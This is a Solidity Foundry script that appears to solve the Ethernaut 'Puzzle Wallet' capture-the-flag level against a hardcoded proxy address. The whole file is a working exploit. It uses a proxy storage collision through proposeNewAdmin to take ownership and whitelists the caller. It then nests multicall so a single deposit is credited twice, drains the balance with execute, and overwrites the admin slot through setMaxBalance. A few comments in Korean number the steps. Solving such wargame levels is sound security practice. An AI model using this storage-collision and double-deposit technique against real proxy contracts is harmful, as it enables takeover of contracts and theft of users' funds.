// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IPuzzleWallet {
    function proposeNewAdmin(address _newAdmin) external;
    function owner() external view returns (address);
    function maxBalance() external view returns (uint256);
    function whitelisted(address) external view returns (bool);
    function balances(address) external view returns (uint256);
    function init(uint256 _maxBalance) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
}

contract PuzzleWalletScript is Script {
    address payable constant proxy = payable(0xD66dfcD92466E3F27d4B781690E4DaF6613B2d95);
    IPuzzleWallet public target;
    bytes[] public multicall_data;
    bytes[] public remulticall_data;

    function run() external {
        vm.startBroadcast();

        target = IPuzzleWallet(proxy);

        console.log("Owner before proposeNewAdmin: %s", target.owner());
        target.proposeNewAdmin(msg.sender);
        console.log("Owner after proposeNewAdmin: %s", target.owner());

        console.log("before whitelisted: %s", target.whitelisted(msg.sender));
        target.addToWhitelist(msg.sender);
        console.log("after whitelisted: %s", target.whitelisted(msg.sender));

        // 1단계
        multicall_data.push(abi.encodeWithSelector(target.deposit.selector));
        remulticall_data.push(abi.encodeWithSelector(target.deposit.selector));
        // 2단계
        multicall_data.push(abi.encodeWithSelector(target.multicall.selector, remulticall_data));
        // 3단계
        multicall_data.push(abi.encodeWithSelector(target.execute.selector, msg.sender, 0.002 ether, ""));

        target.multicall{value: 0.001 ether}(multicall_data);

        target.setMaxBalance(uint256(uint160(msg.sender)));

        vm.stopBroadcast();
    }
}
